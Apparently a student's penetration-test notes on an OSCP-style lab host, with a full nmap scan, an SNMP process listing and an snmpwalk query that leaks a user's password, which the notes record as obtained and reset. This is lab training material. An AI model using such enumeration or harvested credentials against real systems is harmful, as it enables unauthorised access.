# LOOT:
# NMAP:
```
Nmap scan report for 192.168.183.156
Host is up (0.023s latency).
Not shown: 65519 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)
|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)
|_  256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)
25/tcp   open  smtp     Exim smtpd 4.90_1
|_ssl-date: 2025-02-23T15:33:15+00:00; -1m01s from scanner time.
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.200], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http     nginx
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: oscp.exam &mdash; Coming Soon
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_pop3-capabilities: TOP USER SASL(PLAIN LOGIN) PIPELINING STLS AUTH-RESP-CODE UIDL CAPA RESP-CODES
|_ssl-date: TLS randomness does not represent time
143/tcp  open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: AUTH=LOGINA0001 SASL-IR have LITERAL+ listed IMAP4rev1 more LOGIN-REFERRALS IDLE AUTH=PLAIN OK Pre-login STARTTLS ID capabilities ENABLE post-login
465/tcp  open  ssl/smtp Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.200], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2025-02-23T15:30:39+00:00; -3m37s from scanner time.
587/tcp  open  smtp     Exim smtpd 4.90_1
|_ssl-date: 2025-02-23T15:33:54+00:00; -23s from scanner time.
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.200], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: AUTH=LOGINA0001 IMAP4rev1 have more post-login SASL-IR LOGIN-REFERRALS IDLE ENABLE AUTH=PLAIN LITERAL+ ID capabilities Pre-login OK listed
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL PIPELINING AUTH-RESP-CODE CAPA TOP USER SASL(PLAIN LOGIN) RESP-CODES
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
2525/tcp open  smtp     Exim smtpd 4.90_1
|_ssl-date: 2025-02-23T15:32:17+00:00; -2m00s from scanner time.
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.200], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40-0ubuntu0.18.04.1
|   Thread ID: 21
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, InteractiveClient, Support41Auth, Speaks41ProtocolOld, LongPassword, SupportsTransactions, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsCompression, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, ConnectWithDatabase, ODBCClient, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, FoundRows, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: s0\x10\x1C5\x06{2IXH#\x0EA"]J\x07F"
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-11-08T08:15:37
|_Not valid after:  2032-11-05T08:15:37
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: oscp.exam &mdash; Coming Soon
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.183.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/23%OT=21%CT=1%CU=31072%PV=Y%DS=4%DC=T%G=Y%TM=67BB
OS:3FFC%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)
OS:OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578
OS:ST11NW7%O6=M578ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
OS:ECN(R=Y%DF=Y%T=40%W=7210%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: Host: oscp.exam; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1m45s, deviation: 1m24s, median: -2m00s

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   21.69 ms 192.168.45.1
2   23.05 ms 192.168.45.254
3   23.12 ms 192.168.251.1
4   23.20 ms 192.168.183.156
```
# ENUMERATION:
- Ran snmpwalk:
	```
	snmpwalk -v 2c -c public -v1 192.168.195.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
	```
	```
	NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
	```
	- Determined that the string was a code for a password reset so reset the password for jack to "Password123!"
- Obrained creds jack:3PUKsX98BMupBiCf
- PHPmyadmin page discovered
- Jack's last name is Bauer per the vestacp page
## Currently Runnin Procs via snmpwalk
```
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "systemd"
iso.3.6.1.2.1.25.4.2.1.2.2 = STRING: "kthreadd"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "kworker/0:0H"
iso.3.6.1.2.1.25.4.2.1.2.6 = STRING: "mm_percpu_wq"
iso.3.6.1.2.1.25.4.2.1.2.7 = STRING: "ksoftirqd/0"
iso.3.6.1.2.1.25.4.2.1.2.8 = STRING: "rcu_sched"
iso.3.6.1.2.1.25.4.2.1.2.9 = STRING: "rcu_bh"
iso.3.6.1.2.1.25.4.2.1.2.10 = STRING: "migration/0"
iso.3.6.1.2.1.25.4.2.1.2.11 = STRING: "watchdog/0"
iso.3.6.1.2.1.25.4.2.1.2.12 = STRING: "cpuhp/0"
iso.3.6.1.2.1.25.4.2.1.2.13 = STRING: "kdevtmpfs"
iso.3.6.1.2.1.25.4.2.1.2.14 = STRING: "netns"
iso.3.6.1.2.1.25.4.2.1.2.15 = STRING: "rcu_tasks_kthre"
iso.3.6.1.2.1.25.4.2.1.2.16 = STRING: "kauditd"
iso.3.6.1.2.1.25.4.2.1.2.17 = STRING: "khungtaskd"
iso.3.6.1.2.1.25.4.2.1.2.18 = STRING: "oom_reaper"
iso.3.6.1.2.1.25.4.2.1.2.19 = STRING: "writeback"
iso.3.6.1.2.1.25.4.2.1.2.20 = STRING: "kcompactd0"
iso.3.6.1.2.1.25.4.2.1.2.21 = STRING: "ksmd"
iso.3.6.1.2.1.25.4.2.1.2.22 = STRING: "khugepaged"
iso.3.6.1.2.1.25.4.2.1.2.23 = STRING: "crypto"
iso.3.6.1.2.1.25.4.2.1.2.24 = STRING: "kintegrityd"
iso.3.6.1.2.1.25.4.2.1.2.25 = STRING: "kblockd"
iso.3.6.1.2.1.25.4.2.1.2.26 = STRING: "ata_sff"
iso.3.6.1.2.1.25.4.2.1.2.27 = STRING: "md"
iso.3.6.1.2.1.25.4.2.1.2.28 = STRING: "edac-poller"
iso.3.6.1.2.1.25.4.2.1.2.29 = STRING: "devfreq_wq"
iso.3.6.1.2.1.25.4.2.1.2.30 = STRING: "watchdogd"
iso.3.6.1.2.1.25.4.2.1.2.34 = STRING: "kswapd0"
iso.3.6.1.2.1.25.4.2.1.2.35 = STRING: "ecryptfs-kthrea"
iso.3.6.1.2.1.25.4.2.1.2.77 = STRING: "kthrotld"
iso.3.6.1.2.1.25.4.2.1.2.78 = STRING: "acpi_thermal_pm"
iso.3.6.1.2.1.25.4.2.1.2.79 = STRING: "scsi_eh_0"
iso.3.6.1.2.1.25.4.2.1.2.80 = STRING: "scsi_tmf_0"
iso.3.6.1.2.1.25.4.2.1.2.81 = STRING: "scsi_eh_1"
iso.3.6.1.2.1.25.4.2.1.2.82 = STRING: "scsi_tmf_1"
iso.3.6.1.2.1.25.4.2.1.2.88 = STRING: "ipv6_addrconf"
iso.3.6.1.2.1.25.4.2.1.2.89 = STRING: "kworker/0:2"
iso.3.6.1.2.1.25.4.2.1.2.98 = STRING: "kstrp"
iso.3.6.1.2.1.25.4.2.1.2.115 = STRING: "charger_manager"
iso.3.6.1.2.1.25.4.2.1.2.181 = STRING: "scsi_eh_2"
iso.3.6.1.2.1.25.4.2.1.2.182 = STRING: "mpt_poll_0"
iso.3.6.1.2.1.25.4.2.1.2.183 = STRING: "mpt/0"
iso.3.6.1.2.1.25.4.2.1.2.184 = STRING: "scsi_tmf_2"
iso.3.6.1.2.1.25.4.2.1.2.185 = STRING: "scsi_eh_3"
iso.3.6.1.2.1.25.4.2.1.2.186 = STRING: "scsi_tmf_3"
iso.3.6.1.2.1.25.4.2.1.2.187 = STRING: "scsi_eh_4"
iso.3.6.1.2.1.25.4.2.1.2.188 = STRING: "scsi_tmf_4"
iso.3.6.1.2.1.25.4.2.1.2.189 = STRING: "scsi_eh_5"
iso.3.6.1.2.1.25.4.2.1.2.190 = STRING: "scsi_tmf_5"
iso.3.6.1.2.1.25.4.2.1.2.191 = STRING: "scsi_eh_6"
iso.3.6.1.2.1.25.4.2.1.2.193 = STRING: "scsi_tmf_6"
iso.3.6.1.2.1.25.4.2.1.2.195 = STRING: "scsi_eh_7"
iso.3.6.1.2.1.25.4.2.1.2.203 = STRING: "scsi_tmf_7"
iso.3.6.1.2.1.25.4.2.1.2.209 = STRING: "scsi_eh_8"
iso.3.6.1.2.1.25.4.2.1.2.213 = STRING: "scsi_tmf_8"
iso.3.6.1.2.1.25.4.2.1.2.215 = STRING: "scsi_eh_9"
iso.3.6.1.2.1.25.4.2.1.2.217 = STRING: "scsi_tmf_9"
iso.3.6.1.2.1.25.4.2.1.2.220 = STRING: "scsi_eh_10"
iso.3.6.1.2.1.25.4.2.1.2.222 = STRING: "scsi_tmf_10"
iso.3.6.1.2.1.25.4.2.1.2.227 = STRING: "scsi_eh_11"
iso.3.6.1.2.1.25.4.2.1.2.228 = STRING: "scsi_tmf_11"
iso.3.6.1.2.1.25.4.2.1.2.230 = STRING: "scsi_eh_12"
iso.3.6.1.2.1.25.4.2.1.2.233 = STRING: "scsi_tmf_12"
iso.3.6.1.2.1.25.4.2.1.2.234 = STRING: "scsi_eh_13"
iso.3.6.1.2.1.25.4.2.1.2.237 = STRING: "scsi_tmf_13"
iso.3.6.1.2.1.25.4.2.1.2.238 = STRING: "scsi_eh_14"
iso.3.6.1.2.1.25.4.2.1.2.241 = STRING: "scsi_tmf_14"
iso.3.6.1.2.1.25.4.2.1.2.242 = STRING: "scsi_eh_15"
iso.3.6.1.2.1.25.4.2.1.2.244 = STRING: "scsi_tmf_15"
iso.3.6.1.2.1.25.4.2.1.2.245 = STRING: "scsi_eh_16"
iso.3.6.1.2.1.25.4.2.1.2.247 = STRING: "scsi_tmf_16"
iso.3.6.1.2.1.25.4.2.1.2.249 = STRING: "scsi_eh_17"
iso.3.6.1.2.1.25.4.2.1.2.251 = STRING: "scsi_tmf_17"
iso.3.6.1.2.1.25.4.2.1.2.253 = STRING: "scsi_eh_18"
iso.3.6.1.2.1.25.4.2.1.2.254 = STRING: "scsi_tmf_18"
iso.3.6.1.2.1.25.4.2.1.2.256 = STRING: "scsi_eh_19"
iso.3.6.1.2.1.25.4.2.1.2.258 = STRING: "scsi_tmf_19"
iso.3.6.1.2.1.25.4.2.1.2.260 = STRING: "scsi_eh_20"
iso.3.6.1.2.1.25.4.2.1.2.262 = STRING: "scsi_tmf_20"
iso.3.6.1.2.1.25.4.2.1.2.264 = STRING: "scsi_eh_21"
iso.3.6.1.2.1.25.4.2.1.2.266 = STRING: "scsi_tmf_21"
iso.3.6.1.2.1.25.4.2.1.2.268 = STRING: "scsi_eh_22"
iso.3.6.1.2.1.25.4.2.1.2.269 = STRING: "scsi_tmf_22"
iso.3.6.1.2.1.25.4.2.1.2.270 = STRING: "scsi_eh_23"
iso.3.6.1.2.1.25.4.2.1.2.271 = STRING: "scsi_tmf_23"
iso.3.6.1.2.1.25.4.2.1.2.272 = STRING: "scsi_eh_24"
iso.3.6.1.2.1.25.4.2.1.2.273 = STRING: "scsi_tmf_24"
iso.3.6.1.2.1.25.4.2.1.2.274 = STRING: "scsi_eh_25"
iso.3.6.1.2.1.25.4.2.1.2.275 = STRING: "scsi_tmf_25"
iso.3.6.1.2.1.25.4.2.1.2.276 = STRING: "scsi_eh_26"
iso.3.6.1.2.1.25.4.2.1.2.277 = STRING: "scsi_tmf_26"
iso.3.6.1.2.1.25.4.2.1.2.278 = STRING: "scsi_eh_27"
iso.3.6.1.2.1.25.4.2.1.2.279 = STRING: "scsi_tmf_27"
iso.3.6.1.2.1.25.4.2.1.2.280 = STRING: "scsi_eh_28"
iso.3.6.1.2.1.25.4.2.1.2.281 = STRING: "scsi_tmf_28"
iso.3.6.1.2.1.25.4.2.1.2.282 = STRING: "scsi_eh_29"
iso.3.6.1.2.1.25.4.2.1.2.283 = STRING: "scsi_tmf_29"
iso.3.6.1.2.1.25.4.2.1.2.284 = STRING: "scsi_eh_30"
iso.3.6.1.2.1.25.4.2.1.2.285 = STRING: "scsi_tmf_30"
iso.3.6.1.2.1.25.4.2.1.2.286 = STRING: "scsi_eh_31"
iso.3.6.1.2.1.25.4.2.1.2.287 = STRING: "scsi_tmf_31"
iso.3.6.1.2.1.25.4.2.1.2.311 = STRING: "kworker/u2:27"
iso.3.6.1.2.1.25.4.2.1.2.313 = STRING: "kworker/u2:29"
iso.3.6.1.2.1.25.4.2.1.2.315 = STRING: "scsi_eh_32"
iso.3.6.1.2.1.25.4.2.1.2.316 = STRING: "scsi_tmf_32"
iso.3.6.1.2.1.25.4.2.1.2.317 = STRING: "kworker/u2:31"
iso.3.6.1.2.1.25.4.2.1.2.319 = STRING: "kworker/0:1H"
iso.3.6.1.2.1.25.4.2.1.2.321 = STRING: "ttm_swap"
iso.3.6.1.2.1.25.4.2.1.2.322 = STRING: "irq/16-vmwgfx"
iso.3.6.1.2.1.25.4.2.1.2.328 = STRING: "kdmflush"
iso.3.6.1.2.1.25.4.2.1.2.329 = STRING: "bioset"
iso.3.6.1.2.1.25.4.2.1.2.331 = STRING: "kdmflush"
iso.3.6.1.2.1.25.4.2.1.2.333 = STRING: "bioset"
iso.3.6.1.2.1.25.4.2.1.2.410 = STRING: "raid5wq"
iso.3.6.1.2.1.25.4.2.1.2.479 = STRING: "jbd2/dm-0-8"
iso.3.6.1.2.1.25.4.2.1.2.480 = STRING: "ext4-rsv-conver"
iso.3.6.1.2.1.25.4.2.1.2.535 = STRING: "systemd-journal"
iso.3.6.1.2.1.25.4.2.1.2.543 = STRING: "lvmetad"
iso.3.6.1.2.1.25.4.2.1.2.546 = STRING: "iscsi_eh"
iso.3.6.1.2.1.25.4.2.1.2.554 = STRING: "ib-comp-wq"
iso.3.6.1.2.1.25.4.2.1.2.556 = STRING: "ib_mcast"
iso.3.6.1.2.1.25.4.2.1.2.557 = STRING: "ib_nl_sa_wq"
iso.3.6.1.2.1.25.4.2.1.2.559 = STRING: "systemd-udevd"
iso.3.6.1.2.1.25.4.2.1.2.561 = STRING: "rdma_cm"
iso.3.6.1.2.1.25.4.2.1.2.589 = STRING: "systemd-timesyn"
iso.3.6.1.2.1.25.4.2.1.2.598 = STRING: "systemd-network"
iso.3.6.1.2.1.25.4.2.1.2.601 = STRING: "systemd-resolve"
iso.3.6.1.2.1.25.4.2.1.2.656 = STRING: "VGAuthService"
iso.3.6.1.2.1.25.4.2.1.2.657 = STRING: "vmtoolsd"
iso.3.6.1.2.1.25.4.2.1.2.845 = STRING: "dbus-daemon"
iso.3.6.1.2.1.25.4.2.1.2.867 = STRING: "named"
iso.3.6.1.2.1.25.4.2.1.2.877 = STRING: "networkd-dispat"
iso.3.6.1.2.1.25.4.2.1.2.881 = STRING: "snapd"
iso.3.6.1.2.1.25.4.2.1.2.882 = STRING: "accounts-daemon"
iso.3.6.1.2.1.25.4.2.1.2.885 = STRING: "rsyslogd"
iso.3.6.1.2.1.25.4.2.1.2.886 = STRING: "atd"
iso.3.6.1.2.1.25.4.2.1.2.887 = STRING: "systemd-logind"
iso.3.6.1.2.1.25.4.2.1.2.944 = STRING: "lxcfs"
iso.3.6.1.2.1.25.4.2.1.2.949 = STRING: "cron"
iso.3.6.1.2.1.25.4.2.1.2.954 = STRING: "fail2ban-server"
iso.3.6.1.2.1.25.4.2.1.2.956 = STRING: "snmpd"
iso.3.6.1.2.1.25.4.2.1.2.957 = STRING: "unattended-upgr"
iso.3.6.1.2.1.25.4.2.1.2.1028 = STRING: "clamd"
iso.3.6.1.2.1.25.4.2.1.2.1029 = STRING: "polkitd"
iso.3.6.1.2.1.25.4.2.1.2.1040 = STRING: "dovecot"
iso.3.6.1.2.1.25.4.2.1.2.1114 = STRING: "freshclam"
iso.3.6.1.2.1.25.4.2.1.2.1156 = STRING: "anvil"
iso.3.6.1.2.1.25.4.2.1.2.1157 = STRING: "log"
iso.3.6.1.2.1.25.4.2.1.2.1187 = STRING: "sshd"
iso.3.6.1.2.1.25.4.2.1.2.1188 = STRING: "agetty"
iso.3.6.1.2.1.25.4.2.1.2.1191 = STRING: "vesta-nginx"
iso.3.6.1.2.1.25.4.2.1.2.1193 = STRING: "config"
iso.3.6.1.2.1.25.4.2.1.2.1197 = STRING: "vesta-nginx"
iso.3.6.1.2.1.25.4.2.1.2.1228 = STRING: "mysqld"
iso.3.6.1.2.1.25.4.2.1.2.1249 = STRING: "vesta-php"
iso.3.6.1.2.1.25.4.2.1.2.1253 = STRING: "vesta-php"
iso.3.6.1.2.1.25.4.2.1.2.1254 = STRING: "vesta-php"
iso.3.6.1.2.1.25.4.2.1.2.1265 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.1360 = STRING: "spamd"
iso.3.6.1.2.1.25.4.2.1.2.1883 = STRING: "nginx"
iso.3.6.1.2.1.25.4.2.1.2.1884 = STRING: "nginx"
iso.3.6.1.2.1.25.4.2.1.2.1885 = STRING: "nginx"
iso.3.6.1.2.1.25.4.2.1.2.1955 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.2148 = STRING: "vsftpd"
iso.3.6.1.2.1.25.4.2.1.2.2246 = STRING: "spamd child"
iso.3.6.1.2.1.25.4.2.1.2.2248 = STRING: "spamd child"
iso.3.6.1.2.1.25.4.2.1.2.2510 = STRING: "exim4"
iso.3.6.1.2.1.25.4.2.1.2.7399 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.7444 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.7446 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.7775 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.7874 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.7979 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.7988 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8010 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8013 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8014 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8023 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8024 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8052 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8056 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8081 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8088 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8089 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8090 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8094 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8100 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8102 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8112 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8134 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8135 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8136 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8138 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8139 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8140 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8147 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8148 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8176 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8178 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8184 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8185 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8188 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8190 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8191 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8192 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8196 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8198 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8212 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8214 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8452 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8455 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8456 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8459 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8461 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8462 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8485 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8488 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8489 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8490 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8493 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8494 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8495 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8496 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8497 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8499 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8556 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8557 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8560 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8562 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8565 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8569 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8594 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8595 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8602 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8603 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8606 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8621 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8622 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8623 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8624 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8627 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8629 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8630 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8631 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8633 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8634 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8636 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8638 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8639 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8640 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8641 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8642 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8643 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8644 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8646 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8648 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8650 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8651 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8653 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8677 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8679 = STRING: "apache2"
